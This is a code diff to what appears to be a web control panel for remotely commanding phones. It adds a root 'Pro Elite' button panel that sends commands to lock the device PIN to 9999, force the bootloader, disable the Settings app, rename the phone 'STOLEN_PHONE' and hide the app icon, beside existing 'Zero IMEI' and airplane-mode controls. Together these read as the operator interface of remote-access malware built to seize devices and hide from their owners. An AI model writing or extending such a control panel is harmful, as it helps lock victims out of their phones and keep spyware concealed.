@@ -91,6 +91,17 @@
             <button class="btn" style="background:#555; color:#fff;" onclick="sendCommand('airplane_off')">✈️ Airplane OFF</button>
             <button class="btn" style="background:#555; color:#fff;" onclick="sendCommand('imei_zero')">🛑 Zero IMEI</button>
         </div>
+        <!-- ELITE PRO ROOT FEATURES -->
+        <div id="proFeaturesPanel" style="display: none; flex-direction: column; gap: 10px; margin-bottom: 15px; padding-top: 15px; border-top: 1px dashed #ff4444;">
+            <span style="color: #ff4444; font-size: 14px; font-weight: bold;">🔥 LAST BREATH PRO ELITE FEATURES (Requires Root):</span>
+            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                <button class="btn" style="background:#d32f2f; color:#fff;" onclick="sendCommand('change_pin')">🔒 Lock PIN to 9999</button>
+                <button class="btn" style="background:#000; color:#ff0000; border: 1px solid #ff0000;" onclick="sendCommand('reboot_bootloader')">💀 Force Bootloader</button>
+                <button class="btn" style="background:#555; color:#fff;" onclick="sendCommand('disable_settings')">🚫 Disable Settings App</button>
+                <button class="btn" style="background:#e91e63; color:#fff;" onclick="sendCommand('rename_device')">🏷️ Rename to STOLEN_PHONE</button>
+                <button class="btn" style="background:#333; color:#fff;" onclick="sendCommand('hide_app')">🕵️ Hide App Icon</button>
+            </div>
+        </div>
 
         <!-- Danger Zone -->
         <div style="display: flex; gap: 10px; flex-wrap: wrap; padding-top: 15px; border-top: 1px dashed #444;">
@@ -399,6 +410,18 @@ setInterval(function() {
         });
 }, 3000);
 
+// Show Pro Features Panel when a device is selected
+document.getElementById('deviceSelector').addEventListener('change', function() {
+    const val = this.value;
+    const proPanel = document.getElementById('proFeaturesPanel');
+    if (val) {
+        // For testing, we will show the panel whenever a device is selected.
+        // Later, we can check the server to see if the device is actually Pro.
+        proPanel.style.display = 'flex'; 
+    } else {
+        proPanel.style.display = 'none';
+    }
+});
 document.addEventListener('DOMContentLoaded', function(){
     initMap();
     document.getElementById('statsGrid').style.display=token?'grid':'none';
